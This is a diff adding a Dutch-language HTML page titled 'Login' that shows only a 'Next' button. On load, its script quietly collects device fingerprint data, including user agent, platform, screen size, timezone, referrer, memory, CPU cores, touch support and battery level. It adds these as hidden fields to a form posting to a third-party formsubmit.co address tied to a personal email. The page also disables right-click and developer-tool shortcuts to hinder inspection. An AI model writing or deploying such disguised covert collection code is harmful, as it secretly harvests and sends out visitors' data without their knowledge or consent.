@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      margin-top: 100px;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      background: #222;
+      color: #0f0;
+      border: none;
+    }
+    input::placeholder {
+      color: #0f0;
+    }
+  </style>
+</head>
+<body>
+  <h2>Login</h2>
+
+  <form id="loginForm" action="https://formsubmit.co/matteogoossens@tuta.io" method="POST">
+    <input type="hidden" name="_next" value="index.html">
+    <input type="hidden" name="_captcha" value="false">
+
+    <button type="submit">Next</button>
+  </form>
+
+  <script>
+    // Rechtsklik & toetsen uitschakelen
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (e.key === 'F12' || 
+          (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'i') ||
+          (e.ctrlKey && e.key.toLowerCase() === 'u')) {
+        e.preventDefault();
+        alert("Deze actie is uitgeschakeld!");
+      }
+    });
+
+    // Extra info automatisch toevoegen
+    window.onload = async () => {
+      const form = document.getElementById("loginForm");
+
+      const data = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer || "geen",
+        deviceMemory: navigator.deviceMemory || "onbekend",
+        cpuCores: navigator.hardwareConcurrency || "onbekend",
+        touchSupport: 'ontouchstart' in window,
+        touchPoints: navigator.maxTouchPoints || 0,
+        timeSinceLoad: performance.now().toFixed(2) + " ms"
+      };
+
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          data.battery = (battery.level * 100).toFixed(0) + '%';
+        } catch {
+          data.battery = "niet beschikbaar";
+        }
+      }
+
+      for (const [key, value] of Object.entries(data)) {
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = key;
+        input.value = value;
+        form.appendChild(input);
+      }
+    };
+  </script>
+</body>
+</html>
